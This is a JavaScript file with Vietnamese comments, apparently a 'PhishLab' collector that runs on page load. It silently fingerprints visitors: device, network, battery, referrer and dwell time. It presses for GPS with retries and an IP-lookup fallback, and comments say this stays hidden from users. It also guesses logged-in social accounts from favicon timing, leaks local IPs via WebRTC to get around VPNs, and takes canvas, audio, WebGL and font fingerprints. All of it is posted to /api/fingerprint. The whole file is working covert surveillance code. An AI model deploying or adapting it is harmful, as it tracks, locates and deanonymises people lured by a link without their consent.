/**
 * ============================================================
 *  DEVICE FINGERPRINT & INTELLIGENCE COLLECTOR v3.0
 *  Thu thập toàn bộ thông tin từ Rank 1 → Rank 4
 * ============================================================
 */

(function() {
    const sid = window.SESSION_ID || 'unknown_' + Date.now();
    const PAGE_OPEN_TIME = Date.now();
    const ua = navigator.userAgent;

    // =========================================
    //  DETECT In-App WebView — chặn geolocation (silent)
    // =========================================
    const isInAppWebView = /FB_IAB|FBAV|FBAN|Instagram|Messenger|ZaloTheme|ZaloApp|Zalo|Line\//i.test(ua);
    // Không hiện gì cho người dùng — tự fallback IP ngầm

    // =========================================
    //  RANK 1: THÔNG TIN KẾT NỐI MẠNG
    // =========================================
    function getNetworkInfo() {
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        return {
            type: conn ? (conn.effectiveType || conn.type || 'unknown') : 'unknown',
            downlink: conn ? (conn.downlink ? conn.downlink + ' Mbps' : 'N/A') : 'N/A',
            rtt: conn ? (conn.rtt ? conn.rtt + ' ms' : 'N/A') : 'N/A',
            save_data: conn ? (conn.saveData || false) : false,
            online: navigator.onLine,
            in_fb_webview: isInAppWebView
        };
    }

    // =========================================
    //  RANK 2: THÔNG TIN THIẾT BỊ & PHẦN MỀM
    // =========================================
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        return {
            user_agent: ua,
            browser: detectBrowser(ua),
            browser_version: detectBrowserVersion(ua),
            device_name: detectDeviceName(ua),
            device_type: detectDeviceType(ua),
            os: detectOS(ua),
            os_version: detectOSVersion(ua),
            // Màn hình
            screen_width: screen.width,
            screen_height: screen.height,
            viewport: window.innerWidth + 'x' + window.innerHeight,
            pixel_ratio: window.devicePixelRatio || 1,
            color_depth: screen.colorDepth,
            orientation: screen.orientation ? screen.orientation.type : 'unknown',
            // Phần cứng
            platform: navigator.platform,
            vendor: navigator.vendor,
            max_touch_points: navigator.maxTouchPoints || 0,
            hardware_concurrency: navigator.hardwareConcurrency || 'unknown',
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown'
        };
    }

    function detectBrowser(ua) {
        if (/CriOS/i.test(ua)) return 'Chrome (iOS)';
        if (/FxiOS/i.test(ua)) return 'Firefox (iOS)';
        if (/Edg\//i.test(ua)) return 'Edge';
        if (/SamsungBrowser/i.test(ua)) return 'Samsung Internet';
        if (/UCBrowser/i.test(ua)) return 'UC Browser';
        if (/OPR|Opera/i.test(ua)) return 'Opera';
        if (/Firefox/i.test(ua)) return 'Firefox';
        if (/Chrome/i.test(ua)) return 'Chrome';
        if (/Safari/i.test(ua)) return 'Safari';
        return 'Unknown';
    }

    function detectBrowserVersion(ua) {
        const m = ua.match(/(Chrome|Firefox|Safari|OPR|Edg|SamsungBrowser|UCBrowser|CriOS|FxiOS)\/(\d+[\.\d]*)/);
        return m ? m[2] : 'unknown';
    }

    function detectDeviceName(ua) {
        if (/iPhone/i.test(ua)) {
            const h = screen.height, r = window.devicePixelRatio;
            if (h >= 932) return 'iPhone 15 Pro Max / 16 Pro Max';
            if (h >= 896) return 'iPhone 11 Pro Max / XS Max';
            if (h >= 852) return 'iPhone 14 Pro / 15';
            if (h >= 844) return 'iPhone 12/13/14';
            if (h >= 812) return 'iPhone X/XS/11 Pro';
            if (h >= 736) return 'iPhone 6+/7+/8+';
            if (h >= 667) return 'iPhone 6/7/8/SE';
            return 'iPhone';
        }
        if (/iPad/i.test(ua)) return 'iPad';
        if (/Android/i.test(ua)) {
            const m = ua.match(/Android\s[\d.]+;\s*(.+?)(?:\s+Build|[;\)])/);
            if (m) return m[1].trim().replace(/SAMSUNG\s*/i, '');
            return 'Android Device';
        }
        if (/Macintosh/i.test(ua)) return 'Mac';
        if (/Windows/i.test(ua)) return 'Windows PC';
        if (/Linux/i.test(ua)) return 'Linux PC';
        return 'Unknown';
    }

    function detectDeviceType(ua) {
        if (/Mobi|Android.*Mobile|iPhone/i.test(ua)) return 'Điện thoại';
        if (/Tablet|iPad|Android(?!.*Mobile)/i.test(ua)) return 'Máy tính bảng';
        return 'Máy tính';
    }

    function detectOS(ua) {
        if (/iPhone|iPad|iPod/i.test(ua)) return 'iOS';
        if (/Android/i.test(ua)) return 'Android';
        if (/Windows/i.test(ua)) return 'Windows';
        if (/Mac OS X/i.test(ua)) return 'macOS';
        if (/Linux/i.test(ua)) return 'Linux';
        return 'Unknown';
    }

    function detectOSVersion(ua) {
        let m = ua.match(/OS (\d+[_\.]\d+[_\.]?\d*)/);
        if (m) return m[1].replace(/_/g, '.');
        m = ua.match(/Android (\d+[\.\d]*)/);
        if (m) return m[1];
        m = ua.match(/Windows NT (\d+\.\d+)/);
        if (m) return ({ '10.0': '10/11', '6.3': '8.1', '6.1': '7' })[m[1]] || m[1];
        m = ua.match(/Mac OS X (\d+[_\.]\d+[_\.]?\d*)/);
        if (m) return m[1].replace(/_/g, '.');
        return 'unknown';
    }

    // =========================================
    //  RANK 3: NGỮ CẢNH & HÀNH VI
    // =========================================
    function getContextInfo() {
        return {
            // Thời gian
            local_time: new Date().toLocaleString('vi-VN'),
            timestamp: new Date().toISOString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: 'GMT' + (new Date().getTimezoneOffset() <= 0 ? '+' : '-') + Math.abs(new Date().getTimezoneOffset() / 60),
            // Ngôn ngữ
            language: navigator.language || navigator.userLanguage,
            languages: navigator.languages ? navigator.languages.join(', ') : '',
            // Nguồn phát tán link (Referrer)
            referrer: document.referrer || 'Trực tiếp (không có referrer)',
            referrer_source: detectReferrerSource(document.referrer),
            // URL hiện tại
            current_url: window.location.href,
            // Có bật Do Not Track không
            do_not_track: navigator.doNotTrack || 'unset',
            // Có bật cookie không
            cookies_enabled: navigator.cookieEnabled,
            // Có bật JavaScript (hiển nhiên là có vì code này đang chạy)
            js_enabled: true
        };
    }

    function detectReferrerSource(ref) {
        if (!ref) return 'Trực tiếp / Copy link';
        if (/facebook\.com|fb\.com|fbcdn/i.test(ref)) return '📘 Facebook / Messenger';
        if (/zalo/i.test(ref)) return '💬 Zalo';
        if (/telegram/i.test(ref)) return '✈️ Telegram';
        if (/google\.com/i.test(ref)) return '🔍 Google Search';
        if (/tiktok/i.test(ref)) return '🎵 TikTok';
        if (/instagram/i.test(ref)) return '📸 Instagram';
        if (/twitter|x\.com/i.test(ref)) return '🐦 Twitter/X';
        if (/youtube/i.test(ref)) return '📺 YouTube';
        return '🔗 ' + new URL(ref).hostname;
    }

    // Theo dõi thời gian ở trên trang
    let dwellTime = 0;
    let isVisible = true;
    document.addEventListener('visibilitychange', () => {
        isVisible = !document.hidden;
    });
    setInterval(() => {
        if (isVisible) dwellTime++;
    }, 1000);

    // =========================================
    //  RANK 3: PIN
    // =========================================
    async function getBatteryInfo() {
        try {
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                return {
                    level: Math.round(b.level * 100) + '%',
                    charging: b.charging ? 'Đang sạc' : 'Không sạc'
                };
            }
        } catch (e) {}
        return { level: 'N/A' };
    }

    // =========================================
    //  RANK 1 + GPS: VỊ TRÍ
    // =========================================
    function getLocation() {
        return new Promise((resolve) => {
            // FB WebView chặn geolocation → fallback IP ngay
            if (isInAppWebView || !navigator.geolocation) {
                getLocationByIP().then(resolve);
                return;
            }
            // Chrome/Safari thật → thử GPS trước
            navigator.geolocation.getCurrentPosition(
                (pos) => resolve(formatPos(pos)),
                () => {
                    // GPS bị từ chối → thử lại không cần độ chính xác cao
                    navigator.geolocation.getCurrentPosition(
                        (pos) => resolve(formatPos(pos)),
                        () => getLocationByIP().then(resolve),
                        { enableHighAccuracy: false, timeout: 15000, maximumAge: 300000 }
                    );
                },
                { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
            );
        });
    }

    function formatPos(p) {
        return {
            latitude: p.coords.latitude,
            longitude: p.coords.longitude,
            accuracy: Math.round(p.coords.accuracy) + ' m',
            altitude: p.coords.altitude,
            speed: p.coords.speed,
            source: 'GPS',
            google_maps: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`
        };
    }

    async function getLocationByIP() {
        const apis = [
            {
                url: 'https://ipapi.co/json/',
                parse: d => d.latitude ? {
                    latitude: d.latitude, longitude: d.longitude,
                    accuracy: 'IP (~1-50km)', city: d.city,
                    region: d.region, country: d.country_name,
                    isp: d.org, source: 'IP',
                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                } : null
            },
            {
                url: 'https://ip-api.com/json/?fields=lat,lon,city,regionName,country,isp,status',
                parse: d => d.lat && d.status === 'success' ? {
                    latitude: d.lat, longitude: d.lon,
                    accuracy: 'IP (~1-50km)', city: d.city,
                    region: d.regionName, country: d.country,
                    isp: d.isp, source: 'IP',
                    google_maps: `https://www.google.com/maps?q=${d.lat},${d.lon}`
                } : null
            },
            {
                url: 'https://freeipapi.com/api/json',
                parse: d => d.latitude ? {
                    latitude: d.latitude, longitude: d.longitude,
                    accuracy: 'IP (~1-50km)', city: d.cityName,
                    region: d.regionName, country: d.countryName,
                    isp: '', source: 'IP',
                    google_maps: `https://www.google.com/maps?q=${d.latitude},${d.longitude}`
                } : null
            }
        ];
        for (const api of apis) {
            try {
                const c = new AbortController();
                const t = setTimeout(() => c.abort(), 10000);
                const r = await fetch(api.url, { signal: c.signal, mode: 'cors' });
                clearTimeout(t);
                const d = await r.json();
                const result = api.parse(d);
                if (result) return result;
            } catch(e) {}
        }
        return { error: 'Không lấy được vị trí', fb_webview: isInAppWebView };
    }

    // =========================================
    //  RANK 4: PHÁT HIỆN TÀI KHOẢN ĐĂNG NHẬP
    //  (Social Media Login Detection)
    // =========================================
    function detectLoggedInServices() {
        return new Promise((resolve) => {
            const results = {};
            let completed = 0;
            
            // Danh sách các service cần check
            const checks = [
                {
                    name: 'Facebook',
                    // Facebook redirect login page nếu chưa đăng nhập
                    url: 'https://www.facebook.com/favicon.ico',
                    method: 'img'
                },
                {
                    name: 'Google/Gmail', 
                    url: 'https://accounts.google.com/favicon.ico',
                    method: 'img'
                },
                {
                    name: 'YouTube',
                    url: 'https://www.youtube.com/favicon.ico',
                    method: 'img'
                },
                {
                    name: 'TikTok',
                    url: 'https://www.tiktok.com/favicon.ico',
                    method: 'img'
                },
                {
                    name: 'Instagram',
                    url: 'https://www.instagram.com/favicon.ico',
                    method: 'img'
                },
                {
                    name: 'Twitter/X',
                    url: 'https://abs.twimg.com/favicons/twitter.3.ico',
                    method: 'img'
                }
            ];

            const total = checks.length;

            checks.forEach(check => {
                if (check.method === 'img') {
                    const img = new Image();
                    const startTime = performance.now();
                    
                    img.onload = () => {
                        const loadTime = Math.round(performance.now() - startTime);
                        results[check.name] = {
                            reachable: true,
                            load_time_ms: loadTime,
                            // Nếu load nhanh → có thể đã cache → đã đăng nhập
                            likely_logged_in: loadTime < 200
                        };
                        completed++;
                        if (completed >= total) resolve(results);
                    };
                    
                    img.onerror = () => {
                        results[check.name] = {
                            reachable: false,
                            likely_logged_in: false
                        };
                        completed++;
                        if (completed >= total) resolve(results);
                    };

                    // Timeout 5s
                    setTimeout(() => {
                        if (!results[check.name]) {
                            results[check.name] = { reachable: false, timeout: true, likely_logged_in: false };
                            completed++;
                            if (completed >= total) resolve(results);
                        }
                    }, 5000);

                    img.crossOrigin = undefined;
                    img.src = check.url + '?_=' + Date.now();
                }
            });

            // Safety timeout
            setTimeout(() => resolve(results), 6000);
        });
    }

    // =========================================
    //  RANK 5: ADVANCED FINGERPRINTING
    //  WebRTC IP Leak + Canvas + Audio + WebGL
    // =========================================

    // --- WebRTC Local IP Leak (có thể bypass VPN) ---
    function getWebRTCIPs() {
        return new Promise((resolve) => {
            try {
                const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection)({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                const ips = new Set();
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => resolve([]));

                pc.onicecandidate = (e) => {
                    if (!e || !e.candidate) {
                        pc.close();
                        resolve([...ips]);
                        return;
                    }
                    const parts = e.candidate.candidate.split(' ');
                    const ip = parts[4];
                    if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) ips.add(ip);
                    // IPv6
                    if (ip && ip.includes(':')) ips.add(ip);
                };

                // Timeout 5s
                setTimeout(() => { try { pc.close(); } catch(e) {} resolve([...ips]); }, 5000);
            } catch(e) {
                resolve([]);
            }
        });
    }

    // --- Canvas Fingerprint (mỗi GPU render khác nhau) ---
    function getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            canvas.width = 280;
            canvas.height = 60;
            const ctx = canvas.getContext('2d');
            if (!ctx) return { hash: 'unsupported', raw: '' };

            // Vẽ text với font và màu sắc phức tạp
            ctx.textBaseline = 'top';
            ctx.font = '14px \'Arial\'';
            ctx.textBaseline = 'alphabetic';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('PhishLab v3 🔬', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Canvas FP', 4, 45);

            // Vẽ hình phức tạp
            ctx.beginPath();
            ctx.arc(50, 50, 50, 0, Math.PI * 2, true);
            ctx.closePath();
            ctx.fill();

            // Gradient
            const gradient = ctx.createLinearGradient(0, 0, 280, 0);
            gradient.addColorStop(0, 'red');
            gradient.addColorStop(0.5, 'green');
            gradient.addColorStop(1, 'blue');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 30, 280, 10);

            const dataUrl = canvas.toDataURL();
            // Simple hash
            let hash = 0;
            for (let i = 0; i < dataUrl.length; i++) {
                hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
                hash |= 0;
            }

            return {
                hash: 'canvas_' + Math.abs(hash).toString(16),
                data_length: dataUrl.length,
                supported: true
            };
        } catch(e) {
            return { hash: 'error', supported: false };
        }
    }

    // --- Audio Context Fingerprint (mỗi sound card khác nhau) ---
    function getAudioFingerprint() {
        return new Promise((resolve) => {
            try {
                const AudioCtx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
                if (!AudioCtx) { resolve({ hash: 'unsupported' }); return; }

                const ctx = new AudioCtx(1, 44100, 44100);
                const oscillator = ctx.createOscillator();
                oscillator.type = 'triangle';
                oscillator.frequency.setValueAtTime(10000, ctx.currentTime);

                const compressor = ctx.createDynamicsCompressor();
                compressor.threshold.setValueAtTime(-50, ctx.currentTime);
                compressor.knee.setValueAtTime(40, ctx.currentTime);
                compressor.ratio.setValueAtTime(12, ctx.currentTime);
                compressor.attack.setValueAtTime(0, ctx.currentTime);
                compressor.release.setValueAtTime(0.25, ctx.currentTime);

                oscillator.connect(compressor);
                compressor.connect(ctx.destination);
                oscillator.start(0);

                ctx.startRendering().then((renderedBuffer) => {
                    const data = renderedBuffer.getChannelData(0);
                    let sum = 0;
                    for (let i = 4500; i < 5000; i++) sum += Math.abs(data[i]);
                    const hash = sum.toString().replace('.', '').substr(0, 16);
                    resolve({
                        hash: 'audio_' + hash,
                        sample_rate: ctx.sampleRate,
                        supported: true
                    });
                }).catch(() => resolve({ hash: 'blocked', supported: false }));

                setTimeout(() => resolve({ hash: 'timeout' }), 3000);
            } catch(e) {
                resolve({ hash: 'error', supported: false });
            }
        });
    }

    // --- WebGL Renderer Info ---
    function getWebGLInfo() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
            if (!gl) return { supported: false };

            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            return {
                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR),
                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shading_language: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                max_texture_size: gl.getParameter(gl.MAX_TEXTURE_SIZE),
                supported: true
            };
        } catch(e) {
            return { supported: false };
        }
    }

    // --- Installed Fonts Detection (sampling) ---
    function detectFonts() {
        const baseFonts = ['monospace', 'sans-serif', 'serif'];
        const testFonts = [
            'Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia',
            'Comic Sans MS', 'Impact', 'Tahoma', 'Trebuchet MS', 'Palatino',
            'Lucida Console', 'Segoe UI', 'Roboto', 'Ubuntu', 'Helvetica',
            'Calibri', 'Cambria', 'Consolas', 'Century Gothic'
        ];

        const testString = 'mmmmmmmmmmlli';
        const testSize = '72px';
        const body = document.body;

        const span = document.createElement('span');
        span.style.position = 'absolute';
        span.style.left = '-9999px';
        span.style.fontSize = testSize;
        span.style.lineHeight = 'normal';
        span.textContent = testString;
        body.appendChild(span);

        const baseWidths = {};
        baseFonts.forEach(font => {
            span.style.fontFamily = font;
            baseWidths[font] = span.offsetWidth;
        });

        const detected = [];
        testFonts.forEach(font => {
            let found = false;
            baseFonts.forEach(base => {
                span.style.fontFamily = '"' + font + '",' + base;
                if (span.offsetWidth !== baseWidths[base]) found = true;
            });
            if (found) detected.push(font);
        });

        body.removeChild(span);
        return detected;
    }

    // =========================================
    //  GỬI DỮ LIỆU (3 giai đoạn)
    // =========================================
    async function collectAndSend() {
        const device = getDeviceInfo();
        const network = getNetworkInfo();
        const context = getContextInfo();
        const battery = await getBatteryInfo();

        const fingerprint = {
            session_id: sid,
            page_type: window.PAGE_TYPE || 'unknown',
            // Rank 1
            network: network,
            // Rank 2
            device: device,
            // Rank 3
            context: context,
            battery: battery,
            // Rank 5: Advanced (collected sync)
            advanced_fingerprint: {
                canvas: getCanvasFingerprint(),
                webgl: getWebGLInfo(),
                fonts: detectFonts()
            },
            // Placeholder
            location: { error: 'Đang lấy...' },
            social_logins: {},
            dwell_time: '0s'
        };

        // Giai đoạn 1: Gửi ngay device + network + context + canvas/webgl/fonts
        sendData(fingerprint);

        // Giai đoạn 2: Lấy vị trí + social + async fingerprints song song
        const [location, socialLogins, webrtcIPs, audioFP] = await Promise.all([
            getLocation(),
            detectLoggedInServices(),
            getWebRTCIPs(),
            getAudioFingerprint()
        ]);

        fingerprint.location = location;
        fingerprint.social_logins = socialLogins;
        fingerprint.advanced_fingerprint.webrtc_ips = webrtcIPs;
        fingerprint.advanced_fingerprint.audio = audioFP;
        fingerprint.dwell_time = dwellTime + 's';

        // Gửi update đầy đủ
        sendData(fingerprint);
    }

    function sendData(data) {
        data.dwell_time = dwellTime + 's';
        fetch('/api/fingerprint', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    }

    // Gửi update dwell time mỗi 30s
    setInterval(() => {
        sendData({
            session_id: sid,
            page_type: window.PAGE_TYPE || 'unknown',
            update_type: 'dwell_time',
            dwell_time: dwellTime + 's'
        });
    }, 30000);

    // Bắt đầu thu thập
    setTimeout(collectAndSend, 300);

})();
